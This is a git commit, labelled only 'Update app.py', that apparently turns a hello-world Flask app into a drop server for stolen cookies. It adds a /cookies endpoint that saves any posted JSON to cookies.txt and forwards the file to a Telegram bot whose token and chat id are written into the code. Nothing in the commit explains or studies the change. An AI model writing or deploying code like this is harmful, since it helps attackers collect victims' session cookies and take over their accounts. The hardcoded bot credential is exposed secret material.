2290ae3b87506b2c7c6eaa31dbf07336d9228be7
Alexey Kovalenko <epfly@ya.ru>
2021-05-25 00:37:38 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,5 +1,7 @@
 import os
-from flask import Flask
+import requests
+
+from flask import Flask, request
 
 app = Flask(__name__)
 
@@ -7,7 +9,16 @@ app = Flask(__name__)
 def hello():
     return 'Hello World!'
 
+@app.route('/cookies', methods=['POST'])
+def cookies():
+    data = request.get_json()
+    with open('cookies.txt', 'w') as f:
+        f.write('{}\n'.format(data));
+    with open('cookies.txt', 'rb') as f:
+        r = requests.post('https://api.telegram.org/bot1408870234:AAE2GSuLRsf8zo9dAvs3AC0yh89dE_Q13JA/sendDocument', data={'chat_id': 244270350}, files={'document': f})
+        print(r.text)
+
 if __name__ == '__main__':
-    # Bind to PORT if defined, otherwise default to 5000.
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+ 
